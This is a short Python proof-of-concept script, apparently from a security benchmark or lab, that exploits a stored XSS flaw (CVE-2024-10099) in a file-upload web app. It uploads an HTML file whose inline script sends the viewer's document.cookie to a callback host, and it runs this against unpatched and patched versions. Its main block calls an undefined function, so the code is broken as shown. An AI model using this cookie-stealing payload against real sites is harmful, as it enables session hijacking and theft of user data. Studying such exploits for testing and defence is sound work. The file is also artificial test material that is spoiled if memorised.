#!/usr/bin/env python3
"""[GIVEN] CVE-2024-10099 seed exploit -- stored XSS via an uploaded .html file served by /view.

Upload payload.html (an HTML doc with an inline <script>) via /upload/image, then the victim
views it at /view?filename=payload.html. On V0 (pre-PR#6034) /view serves it as text/html ->
the browser renders it -> the inline script reads document.cookie and exfiltrates the flag. On
V1 (=CVE-2024-10099-patched: extension blocklist {.html,.htm,.js,.css} -> application/octet-stream)
the .html is force-downloaded -> nothing renders -> BLOCKED (no flag). This is the guard that
CVE-2025-6092 later bypasses.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from poc_common import run_payload, CB  # noqa: E402

ORIGINAL_FILENAME = "payload.html"
# HTML document: the inline <script> runs when /view serves it as text/html (renderable).
ORIGINAL_PAYLOAD = (
    "<html><body><script>document.location=\"" + CB + "\"+document.cookie</script></body></html>"
)


def original_poc(*, version="v1"):
    """Run the CVE1 seed on `version`; returns the callback dump (flag present IFF it executed)."""
    return run_payload(ORIGINAL_FILENAME, ORIGINAL_PAYLOAD, version)


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
